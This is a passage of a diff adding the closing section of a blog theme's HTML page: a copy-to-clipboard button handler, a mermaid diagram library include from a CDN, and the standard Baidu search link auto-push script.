+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+<!-- mermaid -->
+
+  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+<!-- baiduSpider auto push -->
+
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https'){
+       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else{
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+    </script>
+
+
+    
+  </div>
+</body>
+
+</html>
